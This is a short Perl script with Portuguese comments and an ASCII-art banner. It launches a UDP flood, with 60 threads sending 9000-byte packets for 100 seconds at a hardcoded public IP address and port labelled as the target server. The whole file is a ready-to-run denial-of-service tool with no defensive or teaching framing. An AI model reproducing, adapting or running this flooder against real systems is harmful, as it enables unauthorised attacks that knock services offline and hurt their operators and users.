use strict;
use warnings;
use IO::Socket::INET;
use threads;
use threads::shared;
use Time::HiRes qw(time);
use Term::ANSIColor;

# Servidor Alvo Hsjsshsh
my $server_ip = '144.126.131.134';  # IP do servidor de destino
my $server_port = 2002;      # Porta do servidor de destino
my $packet_size = 9000;        # Tamanho do pacote em bytes
my $num_threads = 60;         # Número de threads
my $duration = 100;            # Duração em segundos

sub send_udp_packet {
    my ($server_ip, $server_port, $packet_size, $duration) = @_;
    my $socket = IO::Socket::INET->new(
        Proto    => 'udp',
        PeerAddr => $server_ip,
        PeerPort => $server_port,
    ) or die "Não foi possível criar o socket: $!
";

    my $data = 'A' x $packet_size;
    my $end_time = time() + $duration;

    while (time() < $end_time) {
        $socket->send($data) or die "Não foi possível enviar o pacote: $!
";
    }

    $socket->close();
}

sub print_colored_message {
    print color('bold yellow');
    print "########:'####:'##::::'##:
";
    print "..... ##::. ##::. ##::'##::
";
    print ":::: ##:::: ##:::. ##'##:::
";
    print "::: ##::::: ##::::. ###::::
";
    print ":: ##:::::: ##:::: ## ##:::
";
    print ": ##::::::: ##::: ##:. ##::
";
    print "########:'####: ##:::. ##:
";
    print "........::....::..:::::..::
";
    print color('reset');
}

print_colored_message();

my @threads;
for (1..$num_threads) {
    push @threads, threads->create(\&send_udp_packet, $server_ip, $server_port, $packet_size, $duration);
}

$_->join() for @threads;

print color('bold white');
print "Envio de pacotes concluído.
";
print color('reset');
